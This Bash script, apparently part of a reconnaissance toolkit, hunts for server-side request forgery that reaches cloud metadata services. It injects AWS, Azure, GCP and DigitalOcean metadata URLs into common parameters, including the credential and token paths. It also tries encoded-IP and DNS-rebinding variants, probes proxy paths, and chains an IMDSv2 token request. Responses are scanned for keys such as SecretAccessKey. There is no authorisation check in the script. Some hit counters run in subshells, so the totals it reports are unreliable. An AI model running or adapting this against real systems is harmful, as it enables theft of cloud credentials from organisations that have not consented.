#!/usr/bin/env bash
# ╔══════════════════════════════════════════════════════════════╗
# ║  cl_metadata_ssrf.sh — Cloud Metadata via SSRF                ║
# ║  AWS IMDSv1/v2 · Azure IMDS · GCP · DigitalOcean              ║
# ║  SSRF parameter injection · DNS rebinding · nip.io             ║
# ╚══════════════════════════════════════════════════════════════╝
set -uo pipefail

SCRIPT_NAME="cl_metadata_ssrf.sh"
SCRIPT_DESC="Cloud Metadata via SSRF"

script_usage() {
    echo "Usage: ${SCRIPT_NAME} [OPTIONS]"
    echo ""
    echo "  Test for cloud metadata endpoint access via SSRF parameters."
    echo "  Probes common SSRF-prone parameters with AWS/Azure/GCP/DO"
    echo "  metadata URLs and DNS rebinding payloads."
    echo ""
    echo "Options:"
    echo "  -d, --domain DOMAIN    Target domain"
    echo "  --domains FILE         File with domains (one per line)"
    echo "  -u, --urls FILE        File with URLs (one per line)"
    echo "  -o, --out DIR          Output directory (default: ./out)"
    echo "  -t, --threads N        Concurrency (default: 30)"
    echo "  --keyword KEYWORD      Keyword for bucket/resource name generation"
    echo "  -h, --help             Show this help"
}

LIB_DIR="$(cd "$(dirname "$0")/.." && pwd)"
source "${LIB_DIR}/lib.sh"
parse_common_args "$@"

phase_header "3" "$SCRIPT_DESC"

if [ -z "${DOMAIN:-}" ] && [ -z "${URLS_FILE:-}" ] && [ -z "${DOMAINS_FILE:-}" ]; then
    err "Provide --domain, --domains, or --urls"
    script_usage
    exit 1
fi

# ── Tool checks ──
check_tool curl 2>/dev/null || { err "curl is required"; exit 1; }

# ── Output files ──
METADATA_FINDINGS="${OUT_DIR}/cl_metadata_ssrf_findings.txt"
> "$METADATA_FINDINGS"

# ── Severity tag helper ──
tag_finding() {
    local sev="$1" url="$2" desc="$3"
    echo "[${sev}] ${url} — ${desc}" >> "$METADATA_FINDINGS"
    log "  [${sev}] ${url} — ${desc}"
}

# ── SSRF parameters to test ──
SSRF_PARAMS=(
    "url" "redirect" "next" "dest" "rurl" "target" "uri" "path"
    "go" "file" "page" "feed" "host" "to" "out" "view" "dir"
    "show" "navigation" "open" "document" "folder" "val"
    "validate" "domain" "callback" "return" "site" "html"
    "data" "reference" "pdf" "template" "doc"
)

# ── Cloud metadata endpoints ──
declare -A METADATA_URLS
METADATA_URLS=(
    ["aws_imdsv1"]="http://169.254.169.254/latest/meta-data/"
    ["aws_imdsv1_id"]="http://169.254.169.254/latest/meta-data/instance-id"
    ["aws_imdsv1_iam"]="http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    ["aws_imdsv1_userdata"]="http://169.254.169.254/latest/user-data"
    ["azure_imds"]="http://169.254.169.254/metadata/instance?api-version=2021-02-01"
    ["gcp_meta"]="http://metadata.google.internal/computeMetadata/v1/"
    ["gcp_project"]="http://metadata.google.internal/computeMetadata/v1/project/project-id"
    ["gcp_token"]="http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
    ["digitalocean"]="http://169.254.169.254/metadata/v1/"
    ["do_id"]="http://169.254.169.254/metadata/v1/id"
)

# ── DNS rebinding / nip.io variants ──
REBINDING_URLS=(
    "http://169.254.169.254.nip.io/latest/meta-data/"
    "http://0xa9fea9fe/latest/meta-data/"
    "http://2852039166/latest/meta-data/"
    "http://[::ffff:169.254.169.254]/latest/meta-data/"
    "http://169.254.169.254.sslip.io/latest/meta-data/"
)

# ── Metadata response indicators ──
METADATA_INDICATORS=(
    "ami-id" "instance-id" "instance-type" "local-hostname" "local-ipv4"
    "public-hostname" "public-ipv4" "security-credentials"
    "computeMetadata" "project-id" "service-accounts"
    "AccessKeyId" "SecretAccessKey" "Token"
    "subscriptionId" "resourceGroupName" "vmId"
    "droplet_id" "hostname" "region"
)

# ════════════════════════════════════════════════════════════════
# STEP 1: Build SSRF candidate URL list
# ════════════════════════════════════════════════════════════════
info "Step 1: Building SSRF candidate URL list..."

ssrf_candidates="${OUT_DIR}/_cl_ssrf_candidates.txt"
> "$ssrf_candidates"

# Source 1: URLs file with parameters
if [ -n "${URLS_FILE:-}" ] && [ -f "$URLS_FILE" ]; then
    # Extract URLs containing SSRF-prone parameters
    param_pattern=$(printf '%s=|' "${SSRF_PARAMS[@]}")
    param_pattern="${param_pattern%|}"
    grep -iP "(${param_pattern})" "$URLS_FILE" 2>/dev/null | sort -u >> "$ssrf_candidates" || true
fi

# Source 2: Parameterized URLs from previous phases
if [ -f "${OUT_DIR}/parameterized_urls.txt" ]; then
    param_pattern=$(printf '%s=|' "${SSRF_PARAMS[@]}")
    param_pattern="${param_pattern%|}"
    grep -iP "(${param_pattern})" "${OUT_DIR}/parameterized_urls.txt" 2>/dev/null | sort -u >> "$ssrf_candidates" || true
fi

# Source 3: All URLs from previous phases
if [ -f "${OUT_DIR}/all_urls.txt" ]; then
    param_pattern=$(printf '%s=|' "${SSRF_PARAMS[@]}")
    param_pattern="${param_pattern%|}"
    grep -iP "(${param_pattern})" "${OUT_DIR}/all_urls.txt" 2>/dev/null | sort -u >> "$ssrf_candidates" || true
fi

sort -u -o "$ssrf_candidates" "$ssrf_candidates" 2>/dev/null || true
candidate_count=$(count_lines "$ssrf_candidates")
info "  Found ${candidate_count} SSRF candidate URLs with target parameters"

# ════════════════════════════════════════════════════════════════
# STEP 2: Test SSRF candidates with metadata payloads
# ════════════════════════════════════════════════════════════════
info "Step 2: Testing SSRF candidates with metadata payloads..."

MAX_CANDIDATES=50
ssrf_hits=0

if [ "$candidate_count" -gt 0 ]; then
    head -"$MAX_CANDIDATES" "$ssrf_candidates" | while IFS= read -r url; do
        [ -z "$url" ] && continue

        # Test each SSRF parameter in the URL with AWS IMDSv1 payload (most common)
        for param in "${SSRF_PARAMS[@]}"; do
            # Check if this parameter exists in the URL
            if echo "$url" | grep -qiP "${param}="; then
                # Replace parameter value with metadata URL
                test_url=$(echo "$url" | sed -E "s|(${param})=[^&]*|\1=http://169.254.169.254/latest/meta-data/|i")
                response=$(curl -sk --connect-timeout 8 --max-time 15 "${HUNT_UA_CURL[@]}" "$test_url" 2>/dev/null || echo "")

                if [ -n "$response" ]; then
                    # Check for metadata indicators
                    for indicator in "${METADATA_INDICATORS[@]}"; do
                        if echo "$response" | grep -qi "$indicator"; then
                            ((ssrf_hits++)) || true
                            tag_finding "CRITICAL" "$test_url" "SSRF to AWS metadata — response contains '${indicator}'"
                            break
                        fi
                    done
                fi

                # Also test Azure metadata (requires Metadata header — servers may pass it)
                test_url_azure=$(echo "$url" | sed -E "s|(${param})=[^&]*|\1=http://169.254.169.254/metadata/instance?api-version=2021-02-01|i")
                response_azure=$(curl -sk --connect-timeout 8 --max-time 15 "${HUNT_UA_CURL[@]}" \
                    -H "Metadata: true" "$test_url_azure" 2>/dev/null || echo "")

                if [ -n "$response_azure" ]; then
                    for indicator in "subscriptionId" "resourceGroupName" "vmId" "compute"; do
                        if echo "$response_azure" | grep -qi "$indicator"; then
                            ((ssrf_hits++)) || true
                            tag_finding "CRITICAL" "$test_url_azure" "SSRF to Azure IMDS — response contains '${indicator}'"
                            break
                        fi
                    done
                fi

                # Test GCP metadata (requires Metadata-Flavor header)
                test_url_gcp=$(echo "$url" | sed -E "s|(${param})=[^&]*|\1=http://metadata.google.internal/computeMetadata/v1/|i")
                response_gcp=$(curl -sk --connect-timeout 8 --max-time 15 "${HUNT_UA_CURL[@]}" \
                    -H "Metadata-Flavor: Google" "$test_url_gcp" 2>/dev/null || echo "")

                if [ -n "$response_gcp" ]; then
                    for indicator in "computeMetadata" "project-id" "service-accounts"; do
                        if echo "$response_gcp" | grep -qi "$indicator"; then
                            ((ssrf_hits++)) || true
                            tag_finding "CRITICAL" "$test_url_gcp" "SSRF to GCP metadata — response contains '${indicator}'"
                            break
                        fi
                    done
                fi
            fi
        done
    done
    log "  Metadata SSRF hits: ${ssrf_hits}"
else
    warn "  No SSRF candidate URLs to test"
fi

# ════════════════════════════════════════════════════════════════
# STEP 3: DNS rebinding payloads
# ════════════════════════════════════════════════════════════════
info "Step 3: Testing DNS rebinding payloads..."

rebind_hits=0
if [ "$candidate_count" -gt 0 ]; then
    head -20 "$ssrf_candidates" | while IFS= read -r url; do
        [ -z "$url" ] && continue

        for param in "${SSRF_PARAMS[@]}"; do
            if echo "$url" | grep -qiP "${param}="; then
                for rebind_url in "${REBINDING_URLS[@]}"; do
                    test_url=$(echo "$url" | sed -E "s|(${param})=[^&]*|\1=${rebind_url}|i")
                    response=$(curl -sk --connect-timeout 8 --max-time 15 "${HUNT_UA_CURL[@]}" "$test_url" 2>/dev/null || echo "")

                    if [ -n "$response" ]; then
                        for indicator in "${METADATA_INDICATORS[@]}"; do
                            if echo "$response" | grep -qi "$indicator"; then
                                ((rebind_hits++)) || true
                                tag_finding "CRITICAL" "$test_url" "DNS rebinding SSRF — payload '${rebind_url}' returned '${indicator}'"
                                break 2
                            fi
                        done
                    fi
                done
                break  # Only test first matching param per URL for rebinding
            fi
        done
    done
    log "  DNS rebinding hits: ${rebind_hits}"
fi

# ════════════════════════════════════════════════════════════════
# STEP 4: Direct metadata endpoint probing (from target domains)
# ════════════════════════════════════════════════════════════════
info "Step 4: Direct metadata endpoint probing on target domains..."

direct_hits=0

# Build target list
targets=()
if [ -n "${DOMAINS_FILE:-}" ] && [ -f "$DOMAINS_FILE" ]; then
    while IFS= read -r d; do
        d=$(echo "$d" | sed 's/\*\.//')
        [ -n "$d" ] && targets+=("$d")
    done < "$DOMAINS_FILE"
elif [ -n "${DOMAIN:-}" ]; then
    targets+=("$DOMAIN")
fi

# Common proxy/redirect paths that might reach metadata
PROXY_PATHS=(
    "proxy" "api/proxy" "fetch" "api/fetch" "load" "curl" "request"
    "ssrf" "forward" "navigate" "remote" "external" "get" "grab"
)

for domain in "${targets[@]}"; do
    for scheme in "https" "http"; do
        base_url="${scheme}://${domain}"
        # Quick connectivity check
        base_status=$(curl -sk -o /dev/null -w "%{http_code}" --connect-timeout 5 --max-time 8 "${HUNT_UA_CURL[@]}" "$base_url" 2>/dev/null || echo "000")
        [ "$base_status" = "000" ] && continue

        # Test proxy-like endpoints with metadata payloads
        for proxy_path in "${PROXY_PATHS[@]}"; do
            for meta_key in "aws_imdsv1" "azure_imds" "gcp_meta" "digitalocean"; do
                meta_url="${METADATA_URLS[$meta_key]}"
                test_url="${base_url}/${proxy_path}?url=${meta_url}"

                response=$(curl -sk --connect-timeout 8 --max-time 15 "${HUNT_UA_CURL[@]}" "$test_url" 2>/dev/null || echo "")
                status=$(curl -sk -o /dev/null -w "%{http_code}" --connect-timeout 8 --max-time 15 "${HUNT_UA_CURL[@]}" "$test_url" 2>/dev/null || echo "000")

                if [ "$status" = "200" ] && [ -n "$response" ]; then
                    for indicator in "${METADATA_INDICATORS[@]}"; do
                        if echo "$response" | grep -qi "$indicator"; then
                            ((direct_hits++)) || true
                            tag_finding "CRITICAL" "$test_url" "Direct SSRF via /${proxy_path} — ${meta_key} metadata exposed (${indicator})"
                            break
                        fi
                    done
                fi
            done
        done

        break  # Use first working scheme
    done
done

log "  Direct metadata probing: ${direct_hits} hits"

# ════════════════════════════════════════════════════════════════
# STEP 5: IMDSv2 token endpoint accessibility check
# ════════════════════════════════════════════════════════════════
info "Step 5: IMDSv2 token endpoint check via SSRF..."

imdsv2_hits=0
if [ "$candidate_count" -gt 0 ]; then
    head -10 "$ssrf_candidates" | while IFS= read -r url; do
        [ -z "$url" ] && continue

        for param in "${SSRF_PARAMS[@]}"; do
            if echo "$url" | grep -qiP "${param}="; then
                # IMDSv2 requires PUT with special header — test if token endpoint is reachable
                token_url="http://169.254.169.254/latest/api/token"
                test_url=$(echo "$url" | sed -E "s|(${param})=[^&]*|\1=${token_url}|i")
                response=$(curl -sk --connect-timeout 8 --max-time 15 "${HUNT_UA_CURL[@]}" \
                    -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" \
                    "$test_url" 2>/dev/null || echo "")

                if [ -n "$response" ] && [ ${#response} -gt 10 ]; then
                    # Got a token — try using it
                    token="$response"
                    meta_test_url=$(echo "$url" | sed -E "s|(${param})=[^&]*|\1=http://169.254.169.254/latest/meta-data/|i")
                    meta_response=$(curl -sk --connect-timeout 8 --max-time 15 "${HUNT_UA_CURL[@]}" \
                        -H "X-aws-ec2-metadata-token: ${token}" \
                        "$meta_test_url" 2>/dev/null || echo "")

                    if [ -n "$meta_response" ]; then
                        for indicator in "${METADATA_INDICATORS[@]}"; do
                            if echo "$meta_response" | grep -qi "$indicator"; then
                                ((imdsv2_hits++)) || true
                                tag_finding "CRITICAL" "$test_url" "IMDSv2 SSRF — token obtained AND metadata accessible"
                                break
                            fi
                        done
                    fi
                fi
                break  # One param per URL
            fi
        done
    done
    log "  IMDSv2 probing: ${imdsv2_hits} hits"
fi

# ── Cleanup ──
rm -f "$ssrf_candidates"

# ── Dedup output ──
[ -f "$METADATA_FINDINGS" ] && sort -u -o "$METADATA_FINDINGS" "$METADATA_FINDINGS" 2>/dev/null || true

# ── Summary ──
total_findings=$(count_lines "$METADATA_FINDINGS")
critical_count=$(grep -c '^\[CRITICAL\]' "$METADATA_FINDINGS" 2>/dev/null || echo 0)

log "Cloud metadata SSRF testing complete:"
log "  Total findings:   ${total_findings}"
log "    CRITICAL:       ${critical_count}"
log "  Output: ${METADATA_FINDINGS}"
